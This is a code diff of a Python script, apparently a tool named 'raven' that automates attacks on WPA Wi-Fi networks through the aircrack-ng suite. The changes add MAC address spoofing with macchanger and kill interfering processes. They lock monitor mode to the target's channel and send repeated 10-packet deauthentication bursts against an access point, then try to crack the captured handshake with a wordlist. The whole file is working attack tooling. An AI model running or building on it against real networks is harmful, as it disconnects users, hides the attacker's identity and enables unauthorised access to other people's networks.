@@ -11,6 +11,8 @@ from multiprocessing import Process
     # AP & Associated client=>
     # AP - BSSID, ESSID, PWR, ENC, CIPHER, AUTH
     # Associated client - Connected BSSID, STATION
+
+
 class AccessPoint():
     """AccessPoint"""
     def __init__(self,BSSID, ESSID, Channel, PWR, ENC, CIPHER, AUTH):
@@ -63,39 +65,45 @@ def shutting_down_monitor_mode(name):
     print("Goodbye, little fellow...")
     return
 
-def monitor_mode(name):
+def mac_changer(name):
+    print("Setting up your mac address...")
+    subprocess_command('ifconfig ' + name + ' down')
+    subprocess_command('macchanger ' + name + ' -r')
+
+def monitor_mode(name,channel='0'):
+    if channel == '0':
+        mac_changer(name)
     print("Setting up your device...")
     subprocess_command('ifconfig ' + name + ' up')
     print("All set up, now we will continue into monitor mode...")
-    monitor_mode_wlan = subprocess_command('airmon-ng start ' + name + ' | grep \'monitor mode\' | cut -d \']\' -f 3 | cut -d \')\' -f 1 ')
+    monitor_mode_wlan = subprocess_command('airmon-ng start ' + name + ' ' + channel + ' | grep \'monitor mode\' | cut -d \']\' -f 3 | cut -d \')\' -f 1 ')
     print("Monitor mode successfully put up - " + monitor_mode_wlan)
+    subprocess_command('airmon-ng check kill')
     return monitor_mode_wlan
 
-
-
-def capture_handshake(monitor_mode, point, filtered_clients):
-    #airodump-ng --bssid A0:F3:C1:3D:40:F6 --channel 1 -w smth wlan0mon
-    # thread ( may help )
+def capture_handshake(monitor, point, filtered_clients):
     subprocess_command('rm hands* raven/temp.lst')
 
-    argum = 'airodump-ng --bssid ' + point.get_BSSID() + ' --channel ' +  point.get_Channel() + ' -w handshake ' + monitor_mode
-    # process = Process(target=airodump_smth,args=(argum,))
+    subprocess_command('echo \"temp\" >> raven/temp.lst')
+
+    global name_of_wlan
+    shutting_down_monitor_mode(monitor)
+    name_of_wlan = monitor_mode(name_of_wlan, point.get_Channel())
+
+    argum = 'airodump-ng --bssid ' + point.get_BSSID() + ' -c ' +  point.get_Channel() + ' -w handshake ' + name_of_wlan
 
     command = subprocess.Popen(argum,  stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        shell=True,
                                        preexec_fn=os.setsid)
-    subprocess_command('echo \"temp\" >> raven/temp.lst')
+
 
     while True:
-        time.sleep(2)
-        for client in filtered_clients:
-
-            command_process = subprocess.Popen('aireplay-ng  --deauth 1 -a ' + point.get_BSSID() + ' -c '+ client.get_Station()+ ' ' +  monitor_mode + ' --ignore-negative-one',stdout=subprocess.PIPE,
-                                                                                                                                                                    shell=True)
-            command_process.wait()
-            print(command_process.communicate()[0])
-
+        time.sleep(5)
+        command_process = subprocess.Popen('aireplay-ng  --deauth 10 -a ' + point.get_BSSID() + ' ' +  name_of_wlan + ' --ig',stdout=subprocess.PIPE,
+                                                                                                                                                                shell=True)
+        command_process.wait()
+        print(command_process.communicate()[0])
         smth = subprocess.Popen('aircrack-ng -a 2 -w raven/temp.lst -b ' + point.get_BSSID() + ' handshake-01.cap',stdout=subprocess.PIPE,
                                                                                                                    stderr=subprocess.PIPE,
                                                                                                                    shell=True)
@@ -152,7 +160,10 @@ def csv_parser(file_pos):
 
 
 def airodump(monitor_mode, file_directory):
-        process = subprocess.Popen('airodump-ng -a -w '+file_directory+'raven --output-format csv '+monitor_mode, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
+        process = subprocess.Popen('airodump-ng -a -w ' + file_directory + 'raven --output-format csv ' + monitor_mode, stdout=subprocess.PIPE,
+                                                                                                                  stderr=subprocess.PIPE,
+                                                                                                                  shell=True,
+                                                                                                                  preexec_fn=os.setsid)
 
         time.sleep(15)
 
@@ -202,12 +213,12 @@ try:
     CWD = os.getcwd()
     #First stage - getting the name of the wlan card
     print ("Configuring your wlan card name... Please wait")
-    wlan_name = subprocess_command('iwconfig 2>&1 | grep IEEE | awk \'{print $1}\'')
-    print("Your wlan card name is " + wlan_name)
+    name_of_wlan = subprocess_command('iwconfig 2>&1 | grep IEEE | awk \'{print $1}\'')
+    print("Your wlan card name is " + name_of_wlan)
 
     #Second stage - setting it into monitor mode
 
-    wlan_name = monitor_mode(wlan_name)
+    wlan_name = monitor_mode(name_of_wlan)
 
     #third stage - checking for directory and scanning
     print("Checking for existing directory...")
@@ -215,7 +226,7 @@ try:
     file_directory = checking_dir(CWD + '/raven/')
 
     if  os.listdir(file_directory):
-        subprocess_command('rm -rf ' + file_directory + 'raven*')
+        subprocess_command('rm ' + file_directory + 'raven*')
 
     print("Starting scanning...")
     airodump(wlan_name,file_directory)
